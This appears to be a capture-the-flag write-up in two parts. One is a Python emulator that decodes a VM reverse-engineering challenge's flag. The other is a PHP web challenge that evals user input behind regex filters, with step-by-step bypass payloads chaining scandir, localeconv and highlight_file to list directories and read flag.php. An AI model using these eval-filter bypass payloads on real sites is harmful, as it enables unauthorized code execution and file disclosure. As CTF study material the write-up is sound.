



[TOC]

* TOC
{:toc}


# Writeup


## Reverse
### 0x1 vm

```python
key = [
    0xF4, 0xF1, 0xE1, 0x00, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4,
    0x1F, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x01, 0x00, 0x00, 0x00,
    0xF2, 0xF1, 0xE4, 0x20, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x02,
    0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x21, 0x00, 0x00, 0x00,
    0xF1, 0xE1, 0x03, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x22,
    0x00, 0x00, 0x00, 0xF1, 0xE1, 0x04, 0x00, 0x00, 0x00, 0xF2,
    0xF1, 0xE4, 0x23, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x05, 0x00,
    0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x24, 0x00, 0x00, 0x00, 0xF1,
    0xE1, 0x06, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x25, 0x00,
    0x00, 0x00, 0xF1, 0xE1, 0x07, 0x00, 0x00, 0x00, 0xF2, 0xF1,
    0xE4, 0x26, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x08, 0x00, 0x00,
    0x00, 0xF2, 0xF1, 0xE4, 0x27, 0x00, 0x00, 0x00, 0xF1, 0xE1,
    0x09, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x28, 0x00, 0x00,
    0x00, 0xF1, 0xE1, 0x0A, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4,
    0x29, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x0B, 0x00, 0x00, 0x00,
    0xF2, 0xF1, 0xE4, 0x2A, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x0C,
    0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x2B, 0x00, 0x00, 0x00,
    0xF1, 0xE1, 0x0D, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x2C,
    0x00, 0x00, 0x00, 0xF1, 0xE1, 0x0E, 0x00, 0x00, 0x00, 0xF2,
    0xF1, 0xE4, 0x2D, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x0F, 0x00,
    0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x2E, 0x00, 0x00, 0x00, 0xF1,
    0xE1, 0x10, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x2F, 0x00,
    0x00, 0x00, 0xF1, 0xE1, 0x11, 0x00, 0x00, 0x00, 0xF2, 0xF1,
    0xE4, 0x30, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x12, 0x00, 0x00,
    0x00, 0xF2, 0xF1, 0xE4, 0x31, 0x00, 0x00, 0x00, 0xF1, 0xE1,
    0x13, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x32, 0x00, 0x00,
    0x00, 0xF1, 0xE1, 0x14, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4,
    0x33, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x15, 0x00, 0x00, 0x00,
    0xF2, 0xF1, 0xE4, 0x34, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x16,
    0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x35, 0x00, 0x00, 0x00,
    0xF1, 0xE1, 0x17, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x36,
    0x00, 0x00, 0x00, 0xF1, 0xE1, 0x18, 0x00, 0x00, 0x00, 0xF2,
    0xF1, 0xE4, 0x37, 0x00, 0x00, 0x00, 0xF1, 0xE1, 0x19, 0x00,
    0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x38, 0x00, 0x00, 0x00, 0xF1,
    0xE1, 0x1A, 0x00, 0x00, 0x00, 0xF2, 0xF1, 0xE4, 0x39, 0x00,
    0x00, 0x00, 0xF1, 0xE1, 0x1B, 0x00, 0x00, 0x00, 0xF2, 0xF1,
    0xE4, 0x3A, 0x00, 0x00, 0x00, 0xF3, 0x00, 0x00
]
enc = [0x6B, 0x61, 0x6C, 0x6A, 0x76, 0x38, 0x3C, 0x60, 0x7D, 0x61, 0x3E, 0x52, 0x7B, 0x3C, 0x7F, 0x79, 0x78, 0x4D, 0x61,
       0x52, 0x60, 0x4D, 0x6E, 0x65, 0x3C, 0x63, 0x3E, 0x70]

current = 0
flag = []


def sub_400A31(c):
    global key, current, enc, flag
    v1 = key[1]
    v3 = key[2]

    if v1 == 0xe1:
        current = enc[0]
    elif v1 == 0xe2:
        print('e2, ??/')
    elif v1 == 0xe3:
        print('e3, ??/')
    elif v1 == 0xe4:
        # flag.append(current if not b else current ^ 0xD)
        flag.append(current)
        enc = enc[1:]
    key = key[6:]


def sub_400A01(a1):
    global key, current
    current ^= 0xD
    key = key[1:]


def sub_400BCF(a1):
    global key
    for _ in [0, 1, 2, 3]:
        if key[0] == 0xf1:
            return sub_400A31(0)
        elif key[0] == 0xf2:
            sub_400A01(0)  # f2
        elif key[0] == 0xf3:
            return 0
        elif key[0] == 0xf4:
            print('input')
            key = key[1:]
            return


while 1:
    result = key[0]
    if result == 0xF3:
        break
    sub_400BCF(0)
print(''.join([chr(x) for x in flag]))

```


## Web
### Web12

源码

```php
<?php
header("Content-Type: text/html;charset=utf-8");
include "flag.php";
echo "flag在哪里呢？<br>";
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
flag在哪里呢？
```

构造些能绕过的payload.

```
pos(localeconv()) => '.'
scandir(pos(localeconv())) => scandir('.')
```

看一下当前目录下的文件，`?exp=echo(var_dump(scandir(pos(localeconv()))));`

```
./
?> array(6) { 
[0]=> string(1) "." 
[1]=> string(2) ".." 
[2]=> string(4) ".git" 
[3]=> string(5) "1.php" 
[4]=> string(8) "flag.php" 
[5]=> string(9) "index.php"
}
```

看上级目录下的文件 `?exp=echo(var_dump(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));`

```
../
?> array(3) { 
[0]=> string(1) "." 
[1]=> string(2) ".." 
[2]=> string(4) "html" }
```

看来就在当前目录下处理就行了，next方法可以获取数组的第二个值。把列表逆向排序一下。

打印数组逆向 `?exp=echo(var_dump(array_reverse(scandir(pos(localeconv())))));`

打印数组逆向后第二值即flag.php `?exp=echo(var_dump(next(array_reverse(scandir(pos(localeconv()))))));`

最终payload `?exp=echo(highlight_file(next(array_reverse(scandir(pos(localeconv()))))));`

显示出flag